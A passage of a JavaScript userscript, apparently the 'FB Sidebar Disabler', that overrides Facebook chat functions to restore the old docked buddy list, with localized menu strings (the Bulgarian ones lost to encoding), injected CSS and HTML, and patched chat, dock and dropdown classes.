					} catch (e) {}
					callback(null);
				},
				setItem:function(itemName,itemValue){
					try {
						window.localStorage.setItem(itemName,itemValue);
					} catch (e) {}
				},
				is_fbsidebardisabler_localstore:false
			};
		}
		var workerfunc=function(){
			if ((!window.Env) || (!window.CSS) || (!window.Chat) || (!window.ChatSidebar) || (!window.ChatConfig) || (!window.ChatBuddyList) || (!window.BuddyListNub) || (!window.ChatDisplayInterim) || (!window.chatDisplay) || (!window.ChatTab) || (!window.presence) || (!window.AvailableList) || (!window.Dock) || (!window.Toggler) || (!window.Selector) || (!Function.prototype.defer)) {
				window.setTimeout(workerfunc,100);
				return;
			}
			if (presence.poppedOut && (/^https?:\/\/.*\.facebook\.com\/presence\/popout\.php.*$/.test(window.location.href))) {
				window.setInterval(function(){
					if (!presence.poppedOut) {
						presence.popout();
						presence.poppedOut=true;
					}
				},10);
				return;
			}
			if (!ChatConfig.get('sidebar')) {
				return;
			}
			var currlocale=window.location.href.match(/[?&]locale=([a-z]{2})/);
			if (currlocale) {
				currlocale=currlocale[1];
			} else {
				currlocale=Env.locale.substr(0,2);
			}
			if (currlocale=="it") {
				var lang={
					"chat": "Chat",
					"friendlists": "Liste di amici",
					"friendlists_show": "Mostra in chat le seguenti liste:",
					"friendlists_none": "Nessuna lista di amici disponibile.",
					"friendlists_new": "Crea una nuova lista:",
					"friendlists_typename": "Scrivi il nome di una lista",
					"options": "Opzioni",
					"options_offline": "Passa offline",
					"options_reorder": "Riordina le liste",
					"options_popout": "Apri chat in finestra separata",
					"options_updatelist": "Aggiorna la lista manualmente",
					"options_sound": "Attiva suono per i nuovi messaggi",
					"options_sticky": "Tieni aperta la finestra degli amici online",
					"options_compact": "Mostra solo i nomi degli amici online",
					"options_oldchatstyle": "Utilizza il vecchio stile della chat",
					"loading": "Caricamento in corso...",
					"remove": "Rimuovi",
					"searchfieldtext": "Amici in Chat",
					"errortext": "Si è verificato un problema. Stiamo cercando di risolverlo il prima possibile. Prova più tardi.",
					"save_error": "Impossibile salvare le impostazioni per la Chat"
				};
			} else if (currlocale=="bg") {
				var lang={
					"chat": "???",
					"friendlists": "?????? ? ????????",
					"friendlists_show": "?????? ???? ??????? ? ????:",
					"friendlists_none": "???? ?????? ? ????????.",
					"friendlists_new": "?????? ??? ??????:",
					"friendlists_typename": "?????? ??? ?? ???????",
					"options": "?????????",
					"options_offline": "???? ????? ?????",
					"options_reorder": "??????????? ?????????",
					"options_popout": "?????? ????",
					"options_updatelist": "Manually Update Buddy List",
					"options_sound": "??????? ???? ??? ???? ?????????",
					"options_sticky": "???? ????????? ? ?????????? ?? ????? ???????",
					"options_compact": "???????? ???? ??????? ?? ?????????? ?? ?????",
					"options_oldchatstyle": "????????? ?????? ??? ???",
					"loading": "?????????...",
					"remove": "??????",
					"searchfieldtext": "???????? ? ????",
					"errortext": "Something went wrong. We're working on getting this fixed as soon as we can. You may be able to try again.",
					"save_error": "Unable to save your Chat settings"
				};
			} else {
				var lang={
					"chat": "Chat",
					"friendlists": "Lists",
                                        "friendlists_show": "Show these lists:",
					"friendlists_none": "No lists.",
                                        "friendlists_new": "New list:",
					"friendlists_typename": "Type name",
					"options": "Options",
					"options_offline": "Go offline",
					"options_reorder": "Reorder list",
					"options_popout": "Pop out",
					"options_updatelist": "Update list",
					"options_sound": "Sound on incoming message",
					"options_sticky": "Sticky sidebar",
					"options_compact": "Hide pictures",
					"options_oldchatstyle": "Old chat style",
					"loading": "Loading...",
					"remove": "Remove",
					"searchfieldtext": "Search",
					"errortext": "Something went wrong. We're trying to fix this, hang in there.",
					"save_error": "Unable to save your Chat settings."
				};
			}
			var chatstyle=document.createElement('style');
			chatstyle.setAttribute('type','text/css');
			csstext='#facebook .hidden_elem.fbChatTypeahead{display:block!important}.fbDockWrapper{z-index:1000!important}.fbChatBuddyListDropdown{display:inline-block}.fbChatBuddyListDropdownButton{height:16px}#sidebardisabler_elm_36 i{background-image:url(https://s-static.ak.facebook.com/rsrc.php/v1/zf/r/_IKHHfAgFQe.png);background-repeat:no-repeat;background-position:-91px -152px;display:inline-block;width:8px;height:14px;margin-top:2px;margin-right:5px;vertical-align:top}#sidebardisabler_elm_36 .selected i{background-position:-83px -152px}#sidebardisabler_elm_38 i{background-image:url(https://s-static.ak.facebook.com/rsrc.php/v1/zW/r/0t0iUYDtV0L.png);background-repeat:no-repeat;background-position:-68px -245px;display:inline-block;width:10px;height:14px;margin-top:2px;margin-right:5px;vertical-align:top}#sidebardisabler_elm_38 .selected i{background-position:-58px -245px}.bb .fbDockChatBuddyListNub.openToggler{z-index:100}.bb.oldChat .fbDockChatBuddyListNub.openToggler .fbNubButton,.bb.oldChat .fbDockChatTab.openToggler .fbNubButton{display:block;border:1px solid #777;border-bottom:0;border-top:0;margin-right:-1px}.bb.oldChat .fbDockChatBuddyListNub.openToggler .fbNubButton .label{border-top:1px solid #CCC;padding-top:4px;margin-top:-5px;padding-left:20px}.bb.oldChat .fbDockChatTab.openToggler .fbChatTab{border-top:1px solid #CCC;padding-top:4px;margin-top:-5px}.bb.oldChat .fbNubFlyoutTitlebar{border-color:#254588}.bb.oldChat .fbNubFlyoutHeader,.bb.oldChat .fbNubFlyoutBody,.bb.oldChat .fbNubFlyoutFooter{border-color:#777}.bb.oldChat .fbDockChatBuddyListNub .fbNubFlyout{bottom:25px;width:201px;left:0}.bb.oldChat .fbDockChatTab .fbDockChatTabFlyout{bottom:25px;width:260px;margin-right:-1px;border-bottom:1px solid #777;-webkit-box-shadow:0 1px 1px #777}.bb.oldChat .fbDockChatTab .uiTooltip .right{background-position:left bottom!important}.bb.oldChat .fbDockChatTab.openToggler{width:160px}.bb.oldChat .fbDockChatBuddyListNub{width:200px}.bb.oldChat .rNubContainer .fbNub{margin-left:0}.bb.oldChat .fbNubButton{border-right:none;background:#F4F4F4;background:-moz-linear-gradient(top,#F5F6F6,#DEDDDD);background:-webkit-gradient(linear,left top,left bottom,from(#F5F6F6),to(#DEDDDD));background:-o-linear-gradient(top,#F5F6F6,#DEDDDD);filter:progid:DXImageTransform.Microsoft.Gradient(StartColorStr="#F5F6F6",EndColorStr="#DEDDDD",GradientType=0);-ms-filter:progid:DXImageTransform.Microsoft.Gradient(StartColorStr="#F5F6F6",EndColorStr="#DEDDDD",GradientType=0);border-color:#999;border-radius:0}.bb.oldChat .fbNubButton:hover,.bb.oldChat .openToggler .fbNubButton{background:white}.bb.oldChat .fbDock{border-right:1px solid #999}.bb.oldChat .fbDockChatTab.highlight .fbNubButton,.bb.oldChat .fbDockChatTab.highlight:hover .fbNubButton{background-color:#526EA6;background-image:none;filter:none;-ms-filter:none;border-color:#283B8A}.bb .fbDockChatTab .titlebarText a{color:white}.bb .fbDockChatTab .titlebarText a:hover{text-decoration:none}.bb.oldChat .fbDockChatTab .titlebarText a:hover{text-decoration:underline}.bb.oldChat .fbDockChatTab.openToggler.typing .fbNubButton .fbChatUserTab .wrapWrapper{max-width:113px}.bb.oldChat .fbDockChatTab.openToggler .funhouse{margin-left:0}#sidebardisabler_elm_33{position:static}#sidebardisabler_elm_33 ul{border:none;padding:0}#sidebardisabler_elm_33 li img{margin-top:1px}#sidebardisabler_elm_33 li .text{line-height:25px}.fbNubFlyoutTitlebar .versiontext{display:none}.fbNubFlyoutTitlebar:hover .versiontext{display:inline}.fbChatBuddyListPanel{background-color:#EDEDED;border-bottom:1px solid gray}.fbChatBuddyListDropdown .fbChatBuddyListDropdownButton,.fbChatBuddyListDropdown .fbChatBuddyListDropdownButton:active,.fbChatBuddyListDropdown .fbChatBuddyListDropdownButton:focus,.fbChatBuddyListDropdown .fbChatBuddyListDropdownButton:hover{background-image:none !important;border:0 !important;border-right:1px solid #999 !important;padding-right:6px !important}.fbChatBuddyListFriendListsDropdown .nameInput{width:100%}.fbChatBuddyListOptionsDropdown .uiMenuItem .itemLabel{font-weight:normal;white-space:normal;width:140px}.fbChatBuddyListOptionsDropdown .uiMenuItem .img{display:inline-block;height:11px;margin:0 5px 0 -16px;width:11px}.fbChatBuddyListOptionsDropdown .offline .img{background-image:url(https://s-static.ak.facebook.com/rsrc.php/v1/yT/r/cWd6w4ZgtPx.png);background-repeat:no-repeat;background-position:-111px -307px}.fbChatBuddyListOptionsDropdown .reorder .img{background-image:url(https://s-static.ak.facebook.com/rsrc.php/v1/yT/r/cWd6w4ZgtPx.png);background-repeat:no-repeat;background-position:-88px -307px}.fbChatBuddyListOptionsDropdown .popout .img{background-image:url(https://s-static.ak.facebook.com/rsrc.php/v1/yT/r/cWd6w4ZgtPx.png);background-repeat:no-repeat;background-position:-65px -307px}.fbChatBuddyListOptionsDropdown .async_saving a,.fbChatBuddyListOptionsDropdown .async_saving a:active,.fbChatBuddyListOptionsDropdown .async_saving a:focus,.fbChatBuddyListOptionsDropdown .async_saving a:hover{background-image:url(https://s-static.ak.facebook.com/rsrc.php/v1/yb/r/GsNJNwuI-UM.gif);background-position:1px 5px;background-repeat:no-repeat}';
			if (chatstyle.styleSheet) {
				chatstyle.styleSheet.cssText=csstext;
			} else {
				chatstyle.innerHTML=csstext;
			}
			(document.body||document.head||document.documentElement).appendChild(chatstyle);
			var oldchatstyle=true;
			var fbdockwrapper=document.getElementsByClassName('fbDockWrapper');
			if (fbdockwrapper && fbdockwrapper[0]) {
				fbdockwrapper=fbdockwrapper[0];
			}
			localstore.getItem("fbsidebardisabler_oldchatstyle",function(itemValue){
				oldchatstyle=(itemValue=="0" ? false : true);
				localstore.setItem("fbsidebardisabler_oldchatstyle",(oldchatstyle ? "1" : "0"));
				if (fbdockwrapper) {
					CSS.conditionClass(fbdockwrapper,'oldChat',oldchatstyle);
				}
			});
			ChatSidebar.disable();
			ChatSidebar.isEnabled=function(){return false};
			var oldChatConfigGet=ChatConfig.get;
			ChatConfig.get=function(arg){
				if (arg=='sidebar') {
					return 0;
				}
				if (arg=='sidebar.minimum_width') {
					return 999999;
				}
				return oldChatConfigGet.apply(this,arguments);
			};
			var tabProfileLinkAdder=function(that){
				var anchor=DOM.create('a');
				DOM.setContent(anchor,that.name);
				anchor.href=that.getProfileURI();
				anchor.onclick=function(){
					if (!oldchatstyle) {
						return false;
					}
				};
				var titlebartext=DOM.find(that.chatWrapper,'.titlebarText');
				DOM.setContent(titlebartext,anchor);
			};
			var oldChatTabLoadData=ChatTab.prototype.loadData;
			ChatTab.prototype.loadData=function(){
				var retval=oldChatTabLoadData.apply(this,arguments);
				tabProfileLinkAdder(this);
				return retval;
			};
			var oldChatDisplayInterimUpdateMultichatToolbar=ChatDisplayInterim.prototype.updateMultichatToolbar;
			ChatDisplayInterim.prototype.updateMultichatToolbar=function(id){
				var retval=oldChatDisplayInterimUpdateMultichatToolbar.apply(this,arguments);
				tabProfileLinkAdder(this.tabs[id]);
				return retval;
			};
			for (var thistab in chatDisplay.tabs) {     if (!chatDisplay.tabs.hasOwnProperty(thistab)) continue;
				tabProfileLinkAdder(chatDisplay.tabs[thistab]);
			}
			if (!window.ChatBuddyListDropdown) {
				window.ChatBuddyListDropdown=function(){};
				window.ChatBuddyListDropdown.prototype = {
					init: function (a) {
						this.root = a;
						Selector.listen(a, 'open', function () {
							this._resizeAndFlip();
							var b = Event.listen(window, 'resize', this._resizeAndFlip.bind(this));
							var c = Selector.listen(a, 'close', function () {
								b.remove();
								Selector.unsubscribe(c);
							});
						}.bind(this));
					},
					_resizeAndFlip: function () {
						var a = Vector2.getElementPosition(this.root, 'viewport');
						var g = Vector2.getViewportDimensions();
						var f = a.y > g.y / 2;
						CSS.conditionClass(this.root, 'uiSelectorBottomUp', f);
						if (!ua.ie() || ua.ie() > 7) {
							var b = Selector.getSelectorMenu(this.root);
							var c = Vector2.getElementPosition(b, 'viewport');
							if (f) {
								availableHeight = a.y;
							} else availableHeight = g.y - c.y;
							var d = DOM.find(b, 'ul.uiMenuInner');
							var e = b.scrollHeight - d.scrollHeight;
							availableHeight -= e;
							CSS.setStyle(b, 'max-height', availableHeight + 'px');
						}
					}
				};
				window.ChatBuddyListFriendListsDropdown=function(){
					this.parent=new ChatBuddyListDropdown();
				}
				window.ChatBuddyListFriendListsDropdown.prototype = {
					init: function (b, c, a) {
						this.parent.init(b);
						this.root = this.parent.root;
						this.template = c;
						this.form = a;
						this.menu = DOM.find(b, 'div.menu');
						this.noListsEl = DOM.find(b, 'li.noListsAvailable');
						Arbiter.subscribe('buddylist/initialized', this._initBuddyList.bind(this));
					},
					_initBuddyList: function (a, b) {
						this.buddyList = b;
						Event.listen(this.form, 'submit', this._onSubmitForm.bind(this));
						Selector.listen(this.root, 'open', this._onOpen.bind(this));
						Selector.listen(this.root, 'toggle', this._onToggle.bind(this));
					},
					_clearFriendLists: function () {
						var a = Selector.getOptions(this.root);
						a.forEach(DOM.remove);
					},
					_onOpen: function () {
						var c = this.buddyList.getFriendLists();
						this._clearFriendLists();
						if (count(c) > 0) {
							CSS.hide(this.noListsEl);
							var e = [$N('option')];
							var f = [];
							for (var b in c) {     if (!c.hasOwnProperty(b)) continue;
								var a = c[b].n;
								var g = this.template.render();
								g.setAttribute('data-label', a);
								var d = DOM.find(g, 'span.itemLabel');
								DOM.setContent(d, a);
								DOM.insertBefore(g, this.noListsEl);
								e.push($N('option', {
									value: b
								}));
								c[b].h === 0 && f.push(b);
							}
							Selector.attachMenu(this.root, this.menu, $N('select', e));
							f.forEach(function (h) {
								Selector.setSelected(this.root, h, true);
							}.bind(this));
						} else CSS.show(this.noListsEl);
					},
					_onSubmitForm: function (event) {
						if (!this.nameInput) this.nameInput = DOM.find(this.form, 'input.nameInput');
						var a = this.nameInput.value;
						this.buddyList.createFriendList(a);
						this.nameInput.value = '';
						this.nameInput.blur();
						Selector.toggle(this.root);
						return event.kill();
					},
					_onToggle: function (a) {
						var c = a.option;
						var b = Selector.getOptionValue(c);
						var d = Selector.isOptionSelected(c);
						this.buddyList.handleFlInChat(d, b);
						Selector.toggle(this.root);
					}
				};
				window.ChatBuddyListOptionsDropdown=function(){
					this.parent=new ChatBuddyListDropdown();
				}
				window.ChatBuddyListOptionsDropdown.prototype = {
					init: function (a) {
						this.parent.init(a);
						this.root = this.parent.root;
						Arbiter.subscribe('buddylist/initialized', this._initBuddyList.bind(this));
						Arbiter.subscribe('chat/option-changed', this._onOptionChanged.bind(this));
					},
					_initBuddyList: function (a, b) {
						this.buddyList = b;
						Selector.listen(this.root, 'open', this._onOpen.bind(this));
						Selector.listen(this.root, 'select', this._onSelect.bind(this));
						Selector.listen(this.root, 'toggle', this._onToggle.bind(this));
					},
					changeSetting: function (c, d, a) {
						var b = {};
						b[c] = d;
						new AsyncRequest(chatDisplay.settingsURL).setHandler(this._onChangeSettingResponse.bind(this, c, d)).setErrorHandler(this._onChangeSettingError.bind(this, c, d)).setFinallyHandler(a).setData(b).setAllowCrossPageTransition(true).send();
					},
					_onChangeSettingResponse: function (a, c, b) {
						chatOptions.setSetting(a, c);
						presence.doSync();
					},
					_onChangeSettingError: function (a, c, b) {
						Selector.setSelected(this.root, a, !c);
						Chat.enterErrorMode(lang['save_error']);
					},
					_onOpen: function () {
						var b = Selector.getOption(this.root, 'reorder');
						var a = this.buddyList._getFriendListsInChat().length;
						Selector.setOptionEnabled(b, a > 1);
					},
					_onOptionChanged: function (a, b) {
						var c = b.name;
						if (c === 'sound') Selector.setSelected(this.root, c, b.value);
					},
					_onSelect: function (b) {
						if (this._pendingChange) return false;
						var a = Selector.getOptionValue(b.option);
						switch (a) {
						case 'offline':
							return this.toggleVisibility();
						case 'reorder':
							return this.reorderLists();
						case 'popin':
							return this.popin();
						case 'popout':
							return this.popout();
						}
					},
					_onToggle: function (a) {
						if (this._pendingChange) return false;
						this._pendingChange = true;
						CSS.addClass(a.option, 'async_saving');
						var b = Selector.getOptionValue(a.option);
						var c = Selector.isOptionSelected(a.option);
						this.changeSetting(b, c, this._doneToggling.bind(this, a));
					},
					_doneToggling: function (a) {
						this._pendingChange = false;
						CSS.removeClass(a.option, 'async_saving');
					},
					popin: function () {
						presence.popin();
						Selector.toggle(this.root);
						return false;
					},
					popout: function () {
						presence.popout();
						Selector.toggle(this.root);
						return false;
					},
					reorderLists: function () {
						this.buddyList.enterReorderingFlMode();
						Selector.toggle(this.root);
						return false;
					},
					toggleVisibility: function () {
						chatOptions.toggleVisibility();
						Selector.toggle(this.root);
						return false;
					}
				};
			}
			ChatBuddyListOptionsDropdown.prototype._initBuddyList=function(a,b){
				this.buddyList=b;
				Selector.listen(this.root,'open',this._onOpen.bind(this));
				Selector.listen(this.root,'select',this._onSelect.bind(this));
				Selector.listen(this.root,'toggle',this._onToggle.bind(this));
				try {
					var selectors=DOM.scry(this.root,'.uiMenuItem.uiMenuItemCheckbox.uiSelectorOption.toggle');
					CSS.conditionClass(selectors[0],'checked',chatOptions.getSetting('sound'));
					CSS.conditionClass(selectors[1],'checked',chatOptions.getSetting('sticky_buddylist'));
					CSS.conditionClass(selectors[2],'checked',chatOptions.getSetting('compact_buddylist'));
					localstore.getItem("fbsidebardisabler_oldchatstyle",function(itemValue){
						CSS.conditionClass(selectors[3],'checked',(itemValue=="0" ? false : true));
					});
				} catch (e) {}
			};
			ChatBuddyListOptionsDropdown.prototype._onToggle=function(a){
				if (this._pendingChange) {
					return false;
				}
				this._pendingChange=true;
				CSS.addClass(a.option,'async_saving');
				var b=Selector.getOptionValue(a.option);
				var c=Selector.isOptionSelected(a.option);
				if (b=="oldchatstyle") {
					oldchatstyle=!!c;
					localstore.setItem("fbsidebardisabler_oldchatstyle",(oldchatstyle ? "1" : "0"));
					if (fbdockwrapper) {
						CSS.conditionClass(fbdockwrapper,'oldChat',oldchatstyle);
					}
					chatOptions.setSetting(b,c);
					Dock.resizeAllFlyouts();
					this._doneToggling(a);
					return;
				}
				this.changeSetting(b,c,this._doneToggling.bind(this,a));
			};
			ChatBuddyListOptionsDropdown.prototype._onSelect=function(b){
				if (this._pendingChange) {
					return false;
				}
				var a=Selector.getOptionValue(b.option);
				switch (a) {
				case 'offline':
					return this.toggleVisibility();
				case 'reorder':
					return this.reorderLists();
				case 'popin':
					return this.popin();
				case 'popout':
					return this.popout();
				case 'updatelist':
					return this.updatelist();
				}
			};
			ChatBuddyListOptionsDropdown.prototype.updatelist=function(){
				AvailableList._poller.requestNow();
				Selector.toggle(this.root);
				return false;
			};
			var oldSetUseMaxHeight=Dock.setUseMaxHeight;
			Dock.setUseMaxHeight=function(a,b){
				return oldSetUseMaxHeight.call(this,a,false);
			};
			Chat.toggleSidebar=function(){};
			var oldChatBuddyListShow=ChatBuddyList.prototype.show;
			ChatBuddyList.prototype.show=function(){
				var that=this;
				var retval=oldChatBuddyListShow.apply(that,arguments);
				Dock._resizeNubFlyout($("fbDockChatBuddylistNub"));
				return retval;
			};
			var oldChatBuddyListCompareFunction=ChatBuddyList.prototype._compareFunction;
			ChatBuddyList.prototype._compareFunction=function(a,b){
				if (!ChatUserInfos[a]) {
					return 1;
				}
				if (!ChatUserInfos[b]) {
					return -1;
				}
				try {
					return oldChatBuddyListCompareFunction.apply(this,arguments);
				} catch (e) {
					return -1;
				}
			};
			var oldChatBuddyListRenderItem=ChatBuddyList.prototype._renderItem;
			ChatBuddyList.prototype._renderItem=function(c){
				if (!ChatUserInfos[c]) {
					this.enterErrorMode(lang['errortext']);
					return '';
				}
				try {
					this.exitErrorMode();
					return oldChatBuddyListRenderItem.apply(this,arguments);
				} catch (e) {
					this.enterErrorMode(lang['errortext']);
					return '';
				}
			};
			var onlyfirsttime=true;
			Chat._withComponent('buddyListNub',function(sidebardisabler_var_18){
				if (!onlyfirsttime) {
					return;
				}
				onlyfirsttime=false;
				var thenub,oldelm;
				if ((!(thenub=$("fbDockChatBuddylistNub"))) || (!(oldelm=thenub.getElementsByClassName("fbNubFlyout"))) || (!(oldelm=oldelm[0]))) {
					throw new Error("Cannot find FB Chat window.");
				}
				var newelm=document.createElement('div');
				newelm.className="fbNubFlyout uiToggleFlyout";
				var newhtml='<div class="fbNubFlyoutOuter"><div class="fbNubFlyoutInner"><div class="clearfix fbNubFlyoutTitlebar"><div class="titlebarLabel clearfix"><div class="titlebarTextWrapper">'+lang['chat'] +'<span class="versiontext" style="color:white"> www.chcepe.tk </span></div></div></div><div class="fbNubFlyoutHeader"><div class="fbChatBuddyListPanel" id="sidebardisabler_elm_35"><div class="uiSelector fbChatBuddyListDropdown fbChatBuddyListFriendListsDropdown uiSelectorRight uiSelectorNormal" id="sidebardisabler_elm_36" data-multiple="1"><div class="wrap"><a class="fbChatBuddyListDropdownButton uiSelectorButton uiButton" role="button" href="#" aria-haspopup="1" data-label="'+lang['friendlists']+'" data-length="30" rel="toggle"><i></i><span class="uiButtonText">'+lang['friendlists']+'</span></a><div class="uiSelectorMenuWrapper uiToggleFlyout"><div role="menu" class="uiMenu menu uiSelectorMenu"><ul class="uiMenuInner"><li class="uiMenuItem disabled" data-label="'+lang['friendlists_show']+'"><a class="itemAnchor" role="menuitem" tabindex="0" href="#" rel="ignore"><span class="itemLabel fsm">'+lang['friendlists_show']+'</span></a><span class="itemAnchor disabledAnchor"><span class="itemLabel">'+lang['friendlists_show']+'</span></span></li><li class="uiMenuItem noListsAvailable disabled" data-label="'+lang['friendlists_none']+'"><a class="itemAnchor" role="menuitem" tabindex="-1" href="#" rel="ignore"><span class="itemLabel fsm">'+lang['friendlists_none']+'</span></a><span class="itemAnchor disabledAnchor"><span class="itemLabel">'+lang['friendlists_none']+'</span></span></li><li class="uiMenuItemGroup mvs createForm" title="'+lang['friendlists_new']+'"><div class="groupTitle fsm fwn fcg">'+lang['friendlists_new']+'</div><ul class="uiMenuItemGroupItems"><form class="mhl" action="#" method="post" id="sidebardisabler_elm_37" onsubmit="return Event.__inlineSubmit(this,event)"><input type="hidden" autocomplete="off" name="post_form_id" value="'+Env.post_form_id+'" /><input type="hidden" name="fb_dtsg" value="'+Env.fb_dtsg+'" autocomplete="off" /><input type="text" class="inputtext nameInput DOMControl_placeholder" name="fl_name" placeholder="'+lang['friendlists_typename']+'" value="'+lang['friendlists_typename']+'" title="'+lang['friendlists_typename']+'" /></form></ul></li></ul></div></div></div></div><div class="uiSelector fbChatBuddyListDropdown fbChatBuddyListOptionsDropdown uiSelectorRight uiSelectorNormal" id="sidebardisabler_elm_38" data-multiple="1"><div class="wrap"><a class="fbChatBuddyListDropdownButton uiSelectorButton uiButton" role="button" href="#" aria-haspopup="1" data-label="'+lang['options']+'" data-length="30" rel="toggle"><i></i><span class="uiButtonText">'+lang['options']+'</span></a><div class="uiSelectorMenuWrapper uiToggleFlyout"><div role="menu" class="uiMenu menu uiSelectorMenu"><ul class="uiMenuInner"><li class="uiMenuItem uiMenuItemCheckbox uiSelectorOption offline" data-label="'+lang['options_offline']+'"><a class="itemAnchor" role="menuitemcheckbox" tabindex="0" aria-checked="false" href="#" rel="ignore"><span class="itemLabel fsm"><img class="img" alt="" src="https://s-static.ak.fbcdn.net/rsrc.php/v1/y4/r/-PAXP-deijE.gif" />'+lang['options_offline']+'</span></a></li><li class="uiMenuItem uiMenuItemCheckbox uiSelectorOption reorder" data-label="'+lang['options_reorder']+'"><a class="itemAnchor" role="menuitemcheckbox" tabindex="-1" aria-checked="false" href="#" rel="ignore"><span class="itemLabel fsm"><img class="img" alt="" src="https://s-static.ak.fbcdn.net/rsrc.php/v1/y4/r/-PAXP-deijE.gif" />'+lang['options_reorder']+'</span></a></li><li class="uiMenuItem uiMenuItemCheckbox uiSelectorOption popout" data-label="'+lang['options_popout']+'"><a class="itemAnchor" role="menuitemcheckbox" tabindex="-1" aria-checked="false" href="#" rel="ignore"><span class="itemLabel fsm"><img class="img" alt="" src="https://s-static.ak.fbcdn.net/rsrc.php/v1/y4/r/-PAXP-deijE.gif" />'+lang['options_popout']+'</span></a></li><li class="uiMenuItem uiMenuItemCheckbox uiSelectorOption updatelist" data-label="'+lang['options_updatelist']+'"><a class="itemAnchor" role="menuitemcheckbox" tabindex="-1" aria-checked="false" href="#" rel="ignore"><span class="itemLabel fsm"><img class="img" alt="" src="https://s-static.ak.fbcdn.net/rsrc.php/v1/y4/r/-PAXP-deijE.gif" />'+lang['options_updatelist']+'</span></a></li><li class="uiMenuSeparator"></li><li class="uiMenuItem uiMenuItemCheckbox uiSelectorOption toggle checked" data-label="'+lang['options_sound']+'"><a class="itemAnchor" role="menuitemcheckbox" tabindex="-1" aria-checked="true" href="#" rel="ignore"><span class="itemLabel fsm">'+lang['options_sound']+'</span></a></li><li class="uiMenuItem uiMenuItemCheckbox uiSelectorOption toggle checked" data-label="'+lang['options_sticky']+'"><a class="itemAnchor" role="menuitemcheckbox" tabindex="-1" aria-checked="true" href="#" rel="ignore"><span class="itemLabel fsm">'+lang['options_sticky']+'</span></a></li><li class="uiMenuItem uiMenuItemCheckbox uiSelectorOption toggle checked" data-label="'+lang['options_compact']+'"><a class="itemAnchor" role="menuitemcheckbox" tabindex="-1" aria-checked="true" href="#" rel="ignore"><span class="itemLabel fsm">'+lang['options_compact']+'</span></a></li><li class="uiMenuItem uiMenuItemCheckbox uiSelectorOption toggle checked" data-label="'+lang['options_oldchatstyle']+'"><a class="itemAnchor" role="menuitemcheckbox" tabindex="-1" aria-checked="true" href="#" rel="ignore"><span class="itemLabel fsm">'+lang['options_oldchatstyle']+'</span></a></li></ul></div></div></div><select multiple="1"><option value="" disabled="1">'+lang['options']+'</option><option value="offline">'+lang['options_offline']+'</option><option value="reorder">'+lang['options_reorder']+'</option><option value="popout">'+lang['options_popout']+'</option><option value="updatelist">'+lang['options_updatelist']+'</option><option value="sound" selected="1">'+lang['options_sound']+'</option><option value="sticky_buddylist" selected="1">'+lang['options_sticky']+'</option><option value="compact_buddylist" selected="1">'+lang['options_compact']+'</option><option value="oldchatstyle" selected="1">'+lang['options_oldchatstyle']+'</option></select></div></div></div><div class="fbNubFlyoutBody"><div class="fbNubFlyoutBodyContent"><div class="fbChatBuddyList error" id="sidebardisabler_elm_39"><div class="content"></div><div class="pas status fcg">'+lang['loading']+'</div></div><div class="uiTypeaheadView fbChatBuddyListTypeaheadView dark hidden_elem" id="sidebardisabler_elm_33"></div></div></div><div class="fbNubFlyoutFooter"><div class="uiTypeahead uiClearableTypeahead fbChatTypeahead" id="sidebardisabler_elm_34"><div class="wrap"><label class="clear uiCloseButton" for="sidebardisabler_elm_40"><input title="'+lang['remove']+'" type="button" id="sidebardisabler_elm_40" /></label><input type="hidden" autocomplete="off" class="hiddenInput" /><div class="innerWrap"><input type="text" class="inputtext inputsearch textInput DOMControl_placeholder" autocomplete="off" placeholder="'+lang['searchfieldtext']+'" id="sidebardisabler_elm_41" spellcheck="false" value="'+lang['searchfieldtext']+'" title="'+lang['searchfieldtext']+'" /></div></div></div></div></div></div>';
				newelm.innerHTML=newhtml;
				oldelm.parentNode.replaceChild(newelm,oldelm);

				var sidebardisabler_var_19=new ChatBuddyList();
				var sidebardisabler_var_20=new ChatTypeaheadDataSource({});
				var sidebardisabler_var_21=new Typeahead(sidebardisabler_var_20,{node:$("sidebardisabler_elm_33"),ctor:"TypeaheadView",options:{"autoSelect":true,"renderer":"chat"}},{ctor:"TypeaheadCore",options:{"keepFocused":false,"resetOnSelect":true,"setValueOnSelect":true}},$("sidebardisabler_elm_34"));
				var sidebardisabler_var_22=new ChatBuddyListFriendListsDropdown();
				var sidebardisabler_var_23=new XHPTemplate(HTML("<li class=\"uiMenuItem uiMenuItemCheckbox uiSelectorOption\" data-label=\"\"><a class=\"itemAnchor\" role=\"menuitemcheckbox\" tabindex=\"-1\" aria-checked=\"false\" href=\"#\" rel=\"ignore\"><span class=\"itemLabel fsm\"></span></a></li>"));
				var sidebardisabler_var_24=new ChatBuddyListOptionsDropdown();
				var sidebardisabler_var_25=OrderedFriendsList;

				$("sidebardisabler_elm_40").onmousedown=function(){var c=sidebardisabler_var_21.getCore();c.reset();c.getElement().focus();sidebardisabler_var_19.show();};
				$("sidebardisabler_elm_41").onfocus=function(){return wait_for_load(this,event,function(){sidebardisabler_var_21.init(["chatTypeahead"])});};
				$("sidebardisabler_elm_41").onkeydown=function(){
					var that=this;
					window.setTimeout(function(){
						if (that.value=="" || that.value==that.defaultValue) {
							sidebardisabler_var_19.show();
						} else {
							sidebardisabler_var_19.hide();
						}
					},0);
				};
				$("sidebardisabler_elm_33").onmouseup=function(){
					var that=$("sidebardisabler_elm_41");
					window.setTimeout(function(){
						if (that.value=="" || that.value==that.defaultValue) {
							sidebardisabler_var_19.show();
						} else {
							sidebardisabler_var_19.hide();
						}
					},0);
				};

				sidebardisabler_var_18.root=$("fbDockChatBuddylistNub");
				sidebardisabler_var_18.buddyList=sidebardisabler_var_19;
				sidebardisabler_var_18.typeahead=sidebardisabler_var_21;
				sidebardisabler_var_18.button=DOM.find(sidebardisabler_var_18.root,'a.fbNubButton');
				sidebardisabler_var_18.label=DOM.find(sidebardisabler_var_18.root,'span.label');
				sidebardisabler_var_18.throbber=DOM.find(sidebardisabler_var_18.root,'img.throbber');
				BuddyListNub.TYPEAHEAD_MIN_FRIENDS=BuddyListNub.TYPEAHEAD_MIN_FRIENDS_FLMODE=0;
				Arbiter.subscribe('buddylist/count-changed',function(){
					if (!Chat.isOnline()) {
						return;
					}
					var a=AvailableList.getCount();
					var b=_tx("{Chat} {number-available}",{'Chat':lang['chat'],'number-available':'<span class="count">(<strong>'+a+'</strong>)</span>'});
					this._setLabel(HTML(b));
					CSS.show(this.typeahead.getElement());
				}.bind(sidebardisabler_var_18));

				Arbiter.subscribe('chat-options/initialized',function(e,f){this.setSticky(!!f.getSetting('sticky_buddylist'));}.bind(sidebardisabler_var_18));
				Arbiter.subscribe('chat/option-changed',function(e,f){f.name==='sticky_buddylist' && this.setSticky(!!f.value);}.bind(sidebardisabler_var_18));
